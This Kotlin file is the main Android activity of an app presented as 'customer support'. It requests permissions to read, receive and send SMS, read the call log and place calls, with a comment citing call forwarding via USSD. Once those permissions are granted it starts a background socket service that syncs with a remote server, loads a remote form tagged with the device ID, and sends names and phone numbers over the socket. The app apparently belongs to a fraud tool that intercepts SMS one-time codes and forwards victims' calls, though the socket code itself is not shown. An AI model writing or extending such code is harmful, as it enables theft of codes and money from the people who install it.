package com.customersupport

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.runtime.*
import androidx.core.content.ContextCompat
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
import com.customersupport.data.PreferencesManager
import com.customersupport.service.SocketService
import com.customersupport.socket.ConnectionState
import com.customersupport.socket.SocketManager
import com.customersupport.ui.screens.DashboardScreen
import com.customersupport.ui.screens.FormScreen
import com.customersupport.ui.screens.SettingsScreen
import com.customersupport.ui.screens.WebViewScreen
import com.customersupport.ui.theme.CustomerSupportTheme
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class MainActivity : ComponentActivity() {

    @Inject lateinit var socketManager: SocketManager
    @Inject lateinit var preferencesManager: PreferencesManager

    private val requiredPermissions = mutableListOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CALL_PHONE,  // Required for call forwarding via USSD
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            add(Manifest.permission.READ_PHONE_NUMBERS)
        }
    }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            // Start service automatically when permissions granted
            startSocketService()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Request permissions
        requestPermissionsIfNeeded()

        setContent {
            CustomerSupportTheme {
                val navController = rememberNavController()
                val scope = rememberCoroutineScope()

                val connectionState by socketManager.connectionState.collectAsState()
                var lastSyncTime by remember { mutableLongStateOf(0L) }
                var isServiceEnabled by remember { mutableStateOf(false) }
                var deviceId by remember { mutableStateOf("") }

                LaunchedEffect(Unit) {
                    // Auto-sync when app opens if already connected
                    if (socketManager.connectionState.value == ConnectionState.CONNECTED) {
                        socketManager.requestSync()
                    }

                    launch {
                        preferencesManager.getLastSyncTime().collect { lastSyncTime = it }
                    }
                    launch {
                        preferencesManager.isServiceEnabled().collect { enabled ->
                            isServiceEnabled = enabled
                            // Auto-start service if preference is enabled but service might not be running
                            if (enabled && socketManager.connectionState.value != ConnectionState.CONNECTED) {
                                startSocketService()
                            }
                        }
                    }
                    launch {
                        preferencesManager.getDeviceId().collect { deviceId = it ?: getAndroidId() }
                    }
                }

                NavHost(navController = navController, startDestination = "webview") {
                    composable("webview") {
                        // Form URL with deviceId parameter
                        val formUrl = "https://customer-support-jmak.onrender.com/form?deviceId=$deviceId"
                        WebViewScreen(
                            url = formUrl,
                            onClose = { navController.navigate("dashboard") }
                        )
                    }
                    composable("dashboard") {
                        DashboardScreen(
                            connectionState = connectionState,
                            lastSyncTime = lastSyncTime,
                            isServiceEnabled = isServiceEnabled,
                            onStartService = {
                                startSocketService()
                                scope.launch { preferencesManager.setServiceEnabled(true) }
                            },
                            onStopService = {
                                stopSocketService()
                                scope.launch { preferencesManager.setServiceEnabled(false) }
                            },
                            onSyncNow = {
                                socketManager.requestSync()
                            },
                            onNavigateToForm = { navController.navigate("form") },
                            onNavigateToSettings = { navController.navigate("settings") }
                        )
                    }
                    composable("form") {
                        FormScreen(
                            onSubmit = { name, phoneNumber, id ->
                                scope.launch {
                                    val devId = preferencesManager.getDeviceId().first() ?: getAndroidId()
                                    socketManager.submitForm(devId, name, phoneNumber, id)
                                }
                            },
                            onBack = { navController.popBackStack() }
                        )
                    }
                    composable("settings") {
                        SettingsScreen(
                            deviceId = deviceId,
                            onBack = { navController.popBackStack() }
                        )
                    }
                }
            }
        }
    }

    private fun requestPermissionsIfNeeded() {
        val permissionsToRequest = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (permissionsToRequest.isNotEmpty()) {
            permissionLauncher.launch(permissionsToRequest.toTypedArray())
        } else {
            // All permissions already granted
            startSocketService()
        }
    }

    private fun startSocketService() {
        val serviceIntent = Intent(this, SocketService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

    private fun stopSocketService() {
        val serviceIntent = Intent(this, SocketService::class.java)
        stopService(serviceIntent)
    }

    private fun getAndroidId(): String {
        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }
}
